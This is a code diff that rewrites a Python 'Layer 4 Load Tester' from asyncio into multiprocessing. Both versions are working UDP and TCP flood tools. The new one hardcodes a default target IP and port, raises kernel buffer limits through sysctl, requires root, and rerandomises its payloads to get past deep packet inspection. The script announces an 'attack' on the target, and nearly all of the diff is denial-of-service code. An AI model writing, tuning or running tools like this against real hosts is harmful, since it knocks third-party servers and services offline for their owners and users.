@@ -1,99 +1,141 @@
-import asyncio
-import random
+import multiprocessing as mp
 import socket
-import logging
+import time
+import random
+import os
 import sys
+import threading
 
-# Configure logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# ===================== НАСТРОЙКИ =====================
+DEFAULT_IP = "45.139.132.87"
+DEFAULT_PORT = 80
+# ====================================================
 
-async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
-	while True:
-		try:
-			async with semaphore:
-				reader, writer = await asyncio.open_connection(target_ip, target_port)
-				try:
-					# Blast the payload continuously
-					for _ in range(100):
-						writer.write(payload)
-						await writer.drain()
-						
-					# Log occasionally
-					if random.random() < 0.01:
-						logging.info(f"[L4 TCP] Worker {worker_id} successfully blasted {len(payload)*100} bytes.")
-				except Exception:
-					pass
-				finally:
-					writer.close()
-					await writer.wait_closed()
-		except asyncio.CancelledError:
-			break
-		except Exception:
-			await asyncio.sleep(0.01)
+def set_system_limits():
+    """Повышаем лимиты системы (root)"""
+    try:
+        os.system("sysctl -w net.core.wmem_max=33554432 > /dev/null 2>&1")
+        os.system("sysctl -w net.core.rmem_max=33554432 > /dev/null 2>&1")
+        os.system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' > /dev/null 2>&1")
+        print("[+] Системные лимиты повышены для максимальной производительности")
+    except:
+        pass
 
-async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
-	while True:
-		try:
-			async with semaphore:
-				# UDP is connectionless, so we use raw sockets for max speed
-				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-				# Non-blocking socket
-				sock.setblocking(False)
-				
-				# Get the event loop
-				loop = asyncio.get_running_loop()
-				
-				for _ in range(1000): # Huge burst
-					try:
-						# Send UDP packet using asyncio to avoid blocking
-						await loop.sock_sendto(sock, payload, (target_ip, target_port))
-					except BlockingIOError:
-						await asyncio.sleep(0.001)
-					except Exception:
-						break
-						
-				if random.random() < 0.02:
-						logging.info(f"[L4 UDP] Worker {worker_id} successfully sent UDP burst.")
-				sock.close()
-		except asyncio.CancelledError:
-			break
-		except Exception:
-			await asyncio.sleep(0.01)
 
-async def main():
-	print("--- Layer 4 Load Tester (Hibernet-Level Power) ---")
-	target_ip = input("Insert Target IP (e.g. 45.139.132.87): ").strip()
-	target_port = int(input("Insert Target Port (e.g. 80): ").strip())
-	method = input("Select Method (TCP/UDP): ").strip().upper()
-	threads = int(input("Insert number of async workers (e.g. 5000): ").strip())
-	packet_size = int(input("Insert Payload Size in bytes (default 1024): ") or "1024")
-	
-	# Generate random garbage payload to bypass simple packet inspection
-	payload = random.randbytes(packet_size)
-	
-	# Massive concurrency limit for L4 (OS network stack limit)
-	conn_limit = min(threads, 20000)
-	semaphore = asyncio.Semaphore(conn_limit)
-	
-	tasks = []
-	logging.info(f"Starting L4 {method} attack on {target_ip}:{target_port} with {threads} workers...")
-	
-	for x in range(threads):
-		if method == 'UDP':
-			tasks.append(asyncio.create_task(udp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
-		else:
-			tasks.append(asyncio.create_task(tcp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
-			
-	try:
-		await asyncio.gather(*tasks)
-	except asyncio.CancelledError:
-		logging.info("Attack successfully cancelled.")
+def udp_flood_worker(target_ip, target_port, packet_size, worker_id):
+    """Оптимизированный UDP flood"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64*1024*1024)  # 64MB
+        sock.setblocking(False)
+        
+        payload = random.randbytes(packet_size)
+        target = (target_ip, target_port)
+        packets = 0
+        start_time = time.time()
+        
+        print(f"[UDP-{worker_id}] Запущен → {target_ip}:{target_port} | Packet: {packet_size} bytes")
+        
+        while True:
+            try:
+                sock.sendto(payload, target)
+                packets += 1
+                
+                if packets % 100000 == 0:
+                    payload = random.randbytes(packet_size)  # анти-DPI
+                    elapsed = time.time() - start_time
+                    if elapsed > 0:
+                        speed = (packets * packet_size * 8) / (elapsed * 1_000_000_000)
+                        print(f"[UDP-{worker_id}] ≈ {speed:.2f} Gbps | Packets: {packets:,}")
+            except BlockingIOError:
+                time.sleep(0.00001)
+            except Exception:
+                time.sleep(0.001)
+    except Exception as e:
+        print(f"[UDP-{worker_id}] Error: {e}")
+
+
+def tcp_flood_worker(target_ip, target_port, packet_size, worker_id):
+    """Оптимизированный TCP flood"""
+    payload = random.randbytes(packet_size)
+    print(f"[TCP-{worker_id}] Запущен → {target_ip}:{target_port} | Packet: {packet_size} bytes")
+    
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16*1024*1024)
+            sock.settimeout(3)
+            sock.connect((target_ip, target_port))
+            
+            for _ in range(50):  # burst
+                try:
+                    sock.sendall(payload)
+                except:
+                    break
+                    
+            sock.close()
+        except:
+            time.sleep(0.01)
+
+
+def main():
+    print("=== Layer 4 Load Tester v2.0 (Optimized for 2 cores + Root) ===\n")
+    
+    target_ip = input(f"Insert Target IP (default: {DEFAULT_IP}): ").strip() or DEFAULT_IP
+    target_port_input = input(f"Insert Target Port (default: {DEFAULT_PORT}): ").strip() or str(DEFAULT_PORT)
+    target_port = int(target_port_input)
+    
+    method = (input("Select Method (TCP/UDP/BOTH, default BOTH): ").strip().upper() or "BOTH")
+    if method not in ["TCP", "UDP", "BOTH"]:
+        method = "BOTH"
+    
+    workers_input = input("Number of workers per method (default 8): ").strip() or "8"
+    workers = int(workers_input)
+    
+    packet_size_input = input("Packet size in bytes (default 8192): ").strip() or "8192"
+    packet_size = int(packet_size_input)
+
+    set_system_limits()
+
+    print(f"\n[+] Starting {method} attack on {target_ip}:{target_port}")
+    print(f"[+] Workers: {workers} | Packet size: {packet_size} bytes | Cores: {mp.cpu_count()}\n")
+
+    processes = []
+
+    if method in ["UDP", "BOTH"]:
+        for i in range(workers):
+            p = mp.Process(target=udp_flood_worker, 
+                         args=(target_ip, target_port, packet_size, i+1),
+                         daemon=True)
+            p.start()
+            processes.append(p)
+
+    if method in ["TCP", "BOTH"]:
+        for i in range(workers):
+            p = mp.Process(target=tcp_flood_worker, 
+                         args=(target_ip, target_port, packet_size, i+1),
+                         daemon=True)
+            p.start()
+            processes.append(p)
+
+    try:
+        while True:
+            time.sleep(10)
+            print(f"[•] Attack running... (Press Ctrl+C to stop)")
+    except KeyboardInterrupt:
+        print("\n\n[!] Attack stopped by user.")
+        for p in processes:
+            if p.is_alive():
+                p.terminate()
+        sys.exit(0)
+
 
 if __name__ == '__main__':
-	try:
-		if sys.platform == 'win32':
-			asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-		asyncio.run(main())
-	except KeyboardInterrupt:
-		print("\nStopped by user.")
-		sys.exit(0)
+    if os.geteuid() != 0:
+        print("[!] Запусти скрипт от root (sudo)!")
+        sys.exit(1)
+    
+    if sys.platform == 'win32':
+        mp.set_start_method('spawn')
+    
+    main()
